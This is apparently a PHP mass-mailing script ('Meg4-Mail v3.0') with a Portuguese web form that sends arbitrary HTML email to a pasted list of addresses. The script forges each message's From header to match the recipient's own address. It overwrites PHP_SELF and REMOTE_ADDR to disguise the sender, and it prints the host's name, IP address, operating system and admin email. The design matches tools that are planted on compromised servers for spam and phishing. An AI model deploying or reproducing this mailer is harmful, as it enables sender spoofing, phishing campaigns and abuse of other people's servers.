<?php
$testa = $_POST['veio'];
if($testa != "") {
	$message = $_POST['html'];
	$subject = $_POST['assunto'];
	$nome = $_POST['nome'];
	$de = $_POST['de'];
	$to = $_POST['emails'];

	$email = explode("\n", $to);
	$message = stripslashes($message);

	$i = 0;
	$count = 1;
	while($email[$i]) {
                 $dataHora = date("d/m/Y h:i:s");


				$oldphpself = $_SERVER['PHP_SELF']; 
				$oldremoteaddr = $_SERVER['REMOTE_ADDR'];
				$_SERVER['PHP_SELF'] = "/"; 
				$_SERVER['REMOTE_ADDR'] = $_SERVER['SERVER_ADDR']; 
		
                $EmailTemporario = $email[$i];
                $message = stripslashes($message);
				$msgx = str_replace("%email%", $EmailTemporario, $message);
				$headers  = "MIME-Version: 1.0\n";
				$headers .= "Content-type: text/html; charset=iso-8859-1\n";
//				$headers .= "Content-Transfer-Encoding: base64\n";
				$headers .= "From: ".$nome." <".$EmailTemporario.">\r\n";
//*				$msgx = $message . $dataHora;
//				$msg_temp = base64_encode($msgx). "\n";
//				$tmp[1] = strlen($msg_temp);
//				$tmp[2] = ceil($tmp[1]/76);
//				for ($b = 0; $b <= $tmp[2]; $b++) {
//				$tmp[3] = $b * 76;
//				$message = substr($msg_temp, $tmp[3], 76) . "\n";
//				}
//
			if(mail($EmailTemporario, $subject."      ".$dataHora, $msgx.$dataHora, $headers))
		echo "<font color=blue>* N&#1098;mero: $count <b>".$email[$i]."</b> <font color=black>VEM INFOOOOO....!</font><br><hr>";
		else
		echo "<font color=red>* N&#1098;mero: $count <b>".$email[$i]."</b> <font color=red>EROO NAO ENVIO</font><br><hr>";
		$i++;
		$count++;
	}
	$count--;
	if($ok == "ok")
	echo "[Fim do Envio]"; 

}

?>
<HTML>
<head>
<title>Meg4-Mail v3.0</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<style>
body {
	margin-left: 0;
	margin-right: 0;
	margin-top: 0;
	margin-bottom: 0;
}
.titulo {
	font-family: Arial, Helvetica, sans-serif;
	font-size: 70px;
	color: #000000;
	font-weight: bold;
}

.normal {
	font-family: "Courier New", Courier, monospace;
	font-size: 16px;
	color: #00F;
}

.form {
	font-family: Arial, Helvetica, sans-serif;
	font-size: 10px;
	color: #000000;
	background-color: #0000FF;
	border: 1px dashed #666666;
}

.texto {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	font-weight: bold;
}

.alerta {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	font-weight: bold;
	color: #000;
	font-size: 10px;
}
.normal tr td p strong {
	font-size: 24px;
}
</style>
</head>
<BODY>
<form action="" method="post" enctype="multipart/form-data" name="form1">
  <input type="hidden" name="veio" value="sim">
  <table width="511" height="750" border="0" cellpadding="0" cellspacing="1" bgcolor="#CCCCCC" class="normal">
    <tr>
      <td width="509" height="46" align="center" bgcolor="#000000"><p><strong>Meg4-Mail v3.0</strong></p></td>
    </tr>
    <tr>
      <td height="194" valign="top" bgcolor="#FFFFFF">
	  	<table width="100%"  border="0" cellpadding="0" cellspacing="5" class="normal" height="499">
		  <tr>
            
            
            <td align="right" height="17"><span class="texto">Assunto:</span></td>
            <td height="17"><input name="assunto" value="" type="text"class="normal" id="assunto" style="width:100%" ></td>
          </tr>
          <tr align="center" bgcolor="#99CCFF">
            <td height="20" colspan="2" bgcolor="#99CCFF"><span class="texto">C&oacute;digo HTML:</span></td>
          </tr>
          <tr align="right">
            <td height="146" colspan="2" valign="top"><br>
             <textarea name="html" style="width:100%" rows="8" wrap="VIRTUAL" class="normal" id="html"> 


</textarea>


              <span class="alerta"> HTML</span></td>



          </tr>
          <tr align="center" bgcolor="#99CCFF">
            <td height="47" colspan="2" bgcolor="#000000">E-MAILS<span class="texto"> </span></td>
          </tr>
          <tr align="right">
            <td height="136" colspan="2" valign="top"><br>
              <textarea name="emails" style="width:100%" rows="8" wrap="VIRTUAL" class="normal" id="emails"></textarea>
              <span class="alerta">OBS*Lista em quebra de linha</span> </td>
          </tr>
          <tr>
            <td height="24" align="right" valign="top" colspan="2"><input type="submit" name="Submit" value="Enviar"></td>
          </tr>
        </table>
	  </td>
    </tr>
    <tr>
      <tr align="left"> 
<td colspan="2" bgcolor="#000000" >Nome do Servidor: <?php echo $UNAME = @php_uname(); ?><br>
Endere&#231;o IP: <?php echo $_SERVER['SERVER_ADDR']; ?><br>
Sistema Operacional: <?php echo $OS = @PHP_OS; ?><br>
Email admin: <?php echo $_SERVER['SERVER_ADMIN']; ?> <br>
</td>
    </tr>
  </table>
  </form></body></html>